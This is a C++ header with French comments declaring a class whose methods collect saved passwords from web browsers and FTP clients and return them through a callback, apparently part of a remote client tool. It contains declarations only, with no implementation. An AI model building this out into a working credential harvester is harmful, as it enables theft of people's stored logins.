#pragma once
#include <vector>
#include <functional>
#include "RecoveredPassword.h"

namespace rslm {
	namespace client {
		namespace messages {
			
			using models::RecoveredPassword;
			using PasswordCallback = std::function<void(const std::vector<RecoveredPassword>&)>;

			class PasswordRecoveryHandler {
			public:
				//Recupere les mots de passe des navigateurs
				static void RecoverBrowsers(PasswordCallback callback);
				
				//Recupere les mots de passe des clients FTP
				static void RecoverFtpClients(PasswordCallback callback);

				//Recupere tout
				static void RecoverAll(PasswordCallback callback);

			};
		}// namespace messages
	}//namespace client
}// namespace rslm